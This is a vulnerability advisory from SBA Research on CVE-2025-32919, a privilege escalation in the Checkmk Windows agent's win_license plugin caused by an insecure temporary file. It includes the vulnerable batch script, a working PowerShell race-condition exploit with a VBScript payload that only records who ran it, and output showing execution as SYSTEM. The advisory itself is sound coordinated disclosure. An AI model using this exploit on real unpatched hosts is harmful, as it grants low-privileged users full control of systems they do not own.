# Checkmk Agent Privilege Escalation via Insecure Temporary Files #

## Vulnerability Overview ##

The `win_license` plugin as included in Checkmk agent for Windows versions
before 2.4.0p13, 2.3.0p38 and 2.2.0p46, as well as since version 2.1.0b2 and
2.0.0p28 allows low privileged users to escalate privileges to Local System
due to insecure use of a temporary folder.

* **Identifier**            : SBA-ADV-20250724-01
* **Type of Vulnerability** : Privilege Escalation
* **Software/Product Name** : [Checkmk Agent for Windows](https://github.com/Checkmk/checkmk)
* **Vendor**                : [Checkmk](https://checkmk.com/)
* **Affected Versions**     : < 2.4.0p13, < 2.3.0p38, < 2.2.0p46, => 2.1.0b2,
                              => 2.0.0p28
* **Fixed in Version**      : 2.4.0p13, 2.3.0p38, 2.2.0p46
* **CVE ID**                : CVE-2025-32919
* **CVSS Vector**           : CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
* **CVSS Base Score**       : 8.8 (High)

## Vendor Description ##

> Checkmk is a comprehensive IT monitoring system designed for scalability,
> flexibility, and low resource consumption. It supports infrastructure and
> application monitoring across physical, virtual, containerized, and cloud
> environments.

Source: <https://github.com/Checkmk/checkmk>

## Impact ##

An attacker with access to a low privileged account can fully compromise the
system, by exploiting the vulnerabilities documented in this advisory.

## Vulnerability Description ##

The `win_license` plugin allows monitoring of the current Windows license
state. For this purpose, it calls the script `slmgr.vbs` included in Windows.
Instead of directly calling it, the plugin first copies the script in a temp
folder using the deterministic filename `checkmk_slmgr.vbs` and then executes
it from the temp folder. According to the code comment and commit history, the
purpose is to force English text output. The change was introduced with the
Git commit `fb98c6a69e77ddc05171301d070dcdd69604e453` [1]. In the following
code snippet the problematic code lines are the copy command in line 10 and
the cscript call in line 13.

### C:\ProgramData\checkmk\agent\plugins\win_license.bat ###

```batch hl:10,13
@echo off
set CMK_VERSION="2.4.0p1"
REM ***
REM * plugin to gather and output Windows activation status
REM ***

echo ^<^<^<win_license^>^>^>

REM create a copy of slmgr.vbs outside the system32 folder to force english text output, because this way the language files can't be found anymore
copy /Y "%windir%\system32\slmgr.vbs" "%temp%\checkmk_slmgr.vbs" > NUL

if exist "%temp%\checkmk_slmgr.vbs" (
    cscript //NoLogo "%temp%\checkmk_slmgr.vbs" /dli
    del "%temp%\checkmk_slmgr.vbs" > NUL
) else (
    REM fallback in case temp directory cannot be written to
    cscript //NoLogo "%windir%\System32\slmgr.vbs" /dli
)
```

This introduces a race condition between writing the temp file and executing
it. An attacker can try to win this race and overwrite the temp file before it
is executed. In practical tests this worked very reliable.

When the plugin is run within the default Checkmk stack Check_MK Agent and the
cmk-agent-ctl agent controller, the plugin is executed with Local System
privileges. Moreover, the temporary folder `C:\Windows\Temp` is used, which
has write permissions for the `BUILTIN\Users` group by default. Therefore, any
low-privileged user account can use this vulnerability to escalate privileges
to Local System. Since the plugin runs automatically every minute in the
default configuration, exploitation is possible without any interaction of a
victim.

## Proof of Concept ##

The following exploit continually writes the payload script to the script file
in the temp folder (`C:\Windows\Temp\checkmk_slmgr.vbs`). It overwrites the
file when it already exists.

### exploit.ps1 ###

```powershell
while ($true) {
    Copy-Item "payload.vbs" -Destination "C:\Windows\Temp\checkmk_slmgr.vbs"
}
```

The `payload.vbs` script just outputs the user and computer it is run on and
also writes this text to `C:\Windows\Temp\sba.txt`.

### payload.vbs ###

```vbscript
Set network = CreateObject("WScript.Network")
output = "PoC Code Execution as " & network.UserDomain & "\" & network.UserName & " on " & network.ComputerName

WScript.Echo output

Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile("C:\Windows\Temp\sba.txt", True)
file.WriteLine output
file.Close
```

### Executing the Exploit ###

The exploit is executed as the user `lowpriv`, which is a low-privileged user
account that is part of the `BUILTIN\Users` group:

```powershell
PS C:\Users\lowpriv\Desktop> .\exploit.ps1
```

It occasionally outputs error messages, since sometimes the file cannot be
written, but this does not hinder the function of the exploit.

When we monitor the temp folder with a higher privileged account, we see that
the `checkmk_slmgr.vbs` appears after starting the exploit and after at most
one minute (which is the default check interval), we see that the payload was
executed and `sba.txt` appeared.

```powershell hl:14,20
PS C:\Windows\Temp> while ($true) { echo ---; dir; sleep 1; }
---


    Directory: C:\Windows\Temp


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        23.07.2025     17:34                MsEdgeCrashpad
-a----        24.07.2025     11:35         817426 MpSigStub.log
---
d-----        23.07.2025     17:34                MsEdgeCrashpad
-a----        24.07.2025     15:14            336 checkmk_slmgr.vbs
-a----        24.07.2025     11:35         817426 MpSigStub.log
---
d-----        23.07.2025     17:34                MsEdgeCrashpad
-a----        24.07.2025     15:14            336 checkmk_slmgr.vbs
-a----        24.07.2025     11:35         817426 MpSigStub.log
-a----        24.07.2025     15:23             51 sba.txt
```

When inspecting the file, we see that the payload was executed with the Local
System account:

```powershell hl:2
PS C:\Windows\Temp> type sba.txt
PoC Code Execution as SITE01\SYSTEM on WINHOST1
PS C:\Windows\Temp> (Get-Acl .\sba.txt).access
FileSystemRights  : FullControl
AccessControlType : Allow
IdentityReference : BUILTIN\Administrators
IsInherited       : True
InheritanceFlags  : None
PropagationFlags  : None

FileSystemRights  : FullControl
AccessControlType : Allow
IdentityReference : NT AUTHORITY\SYSTEM
IsInherited       : True
InheritanceFlags  : None
PropagationFlags  : None
```

Furthermore, we can also see that the payload was successfully run by
inspecting the output on the Checkmk server:

```bash hl:26
OMD[site01]:~$ cmk -d winhost1.site01.example --cache | sed -n '/^<<<\(check_mk\|win_license\)>>>/,/^<<</p'
<<<check_mk>>>
Version: 2.4.0p1
BuildDate: May 15 2025
AgentOS: windows
Hostname: WINHOST1
Architecture: 64bit
OSName: Microsoft Windows Server 2022 Datacenter
OSVersion: 10.0.20348
OSType: windows
Time: 2025-07-24T15:23:18+0200
WorkingDirectory: C:\WINDOWS\system32
ConfigFile: C:\Program Files (x86)\checkmk\service\check_mk.yml
LocalConfigFile: C:\ProgramData\checkmk\agent\check_mk.user.yml
AgentDirectory: C:\Program Files (x86)\checkmk\service
PluginsDirectory: C:\ProgramData\checkmk\agent\plugins
StateDirectory: C:\ProgramData\checkmk\agent\state
ConfigDirectory: C:\ProgramData\checkmk\agent\config
TempDirectory: C:\ProgramData\checkmk\agent\tmp
LogDirectory: C:\ProgramData\checkmk\agent\log
SpoolDirectory: C:\ProgramData\checkmk\agent\spool
LocalDirectory: C:\ProgramData\checkmk\agent\local
OnlyFrom:
<<<cmk_agent_ctl_status:sep(0)>>>
<<<win_license>>>
PoC Code Execution as SITE01\SYSTEM on WINHOST1
<<<mssql_instance:sep(124):cached(1753363334,300)>>>
```

Within the Checkmk web interface the check is marked as *Unknown* since the
Checkmk server could not correctly interpret the response of the
`win_license` plugin.

Also, in the agent log we see that `win_license.bat` only generates 70 bytes
output instead of usually 655 bytes.

### C:\ProgramData\checkmk\agent\log\check_mk.log ###

``` hl:8
2025-07-24 15:23:14.443 [ctl:3552] [cmk_agent_ctl::modes::pull][INFO] [::ffff:10.0.0.22]:56114: Handling pull request.
2025-07-24 15:23:14.485 [ctl:3552] [cmk_agent_ctl::modes::pull][DEBUG] [::ffff:10.0.0.22]:56114: Handling pull request DONE (Task detached).
2025-07-24 15:23:14.519 [ctl:3552] [cmk_agent_ctl::modes::pull][DEBUG] handle_request: starts from ::ffff:10.0.0.22
2025-07-24 15:23:14.550 [srv 2428] Request is '::ffff:10.0.0.22 Global\WinAgentCtl_3552_3796_0'
[...]
2025-07-24 15:23:14.683 [srv 2428] [Trace] Exec app '"C:\ProgramData\checkmk\agent\plugins\win_license.bat"', mode [0]
[...]
2025-07-24 15:23:15.276 [srv 2428] perf:  In [592] milliseconds process '"C:\ProgramData\checkmk\agent\plugins\win_license.bat"' pid:[14176] SUCCEDED - generated [70] bytes of data in [2] blocks
[...]
2025-07-24 15:23:19.905 [srv 2428] Send [52490] bytes of data to [Global\WinAgentCtl_3552_3796_0] - OK
2025-07-24 15:23:19.921 [ctl:3552] [cmk_agent_ctl::modes::pull][DEBUG] handle_request: ready to be send ::ffff:10.0.0.22
2025-07-24 15:23:19.955 [ctl:3552] [cmk_agent_ctl::modes::pull][DEBUG] handle_request: had been send ::ffff:10.0.0.22
2025-07-24 15:23:19.985 [ctl:3552] [rustls::common_state][DEBUG] Sending warning alert CloseNotify
2025-07-24 15:23:20.016 [ctl:3552] [cmk_agent_ctl::modes::pull][DEBUG] processed task 1 from ip ::ffff:10.0.0.22 result Ok(())
```

## Recommended Countermeasures ##

We recommend updating to Checkmk version 2.4.0p13, 2.3.0p38, 2.2.0p46 or
later, which applies the following countermeasure, and make sure that all
hosts use the updated plugin version.

We recommend storing data only in folders with appropriately restricted file
permissions.

Moreover, when using temporary folders, it is best practice to use
non-predictable filenames.

## Timeline ##

* `2025-07-24` identification of vulnerability in version 2.4.0p1
* `2025-08-01` initial vendor contact via <security@checkmk.com>
* `2025-08-04` disclosed vulnerability to vendor
* `2025-08-04` vendor response with initial assessment
* `2025-08-08` vendor confirmed vulnerability and assigned CVE-2025-32919
* `2025-10-06` vendor pre-announced fix [2]
* `2025-10-09` vendor released fix in versions 2.4.0p13, 2.3.0p38 and 2.2.0p46
* `2025-10-13` public disclosure

## References ##

1. Checkmk Source Code. Commit fb98c6a69e77ddc05171301d070dcdd69604e453. Fix
   for non english windows installations to force english output:
   <https://github.com/Checkmk/checkmk/commit/fb98c6a69e77ddc05171301d070dcdd69604e453>
2. Checkmk. Upcoming Checkmk Security Release 2.4.0p13, 2.3.0p38 and 2.2.0p46:
   <https://forum.checkmk.com/t/upcoming-checkmk-security-release-2-4-0p13-2-3-0p38-and-2-2-0p46/55905>
3. Checkmk. Werk #18207 Fix security vulnerability in win_license.bat plugin:
   <https://checkmk.com/werk/18207>
4. Common Weakness Enumeration. CWE-377 Insecure Temporary File:
   <https://cwe.mitre.org/data/definitions/377.html>

## Credits ##

* Lisa Gnedt ([SBA Research](https://www.sba-research.org/))
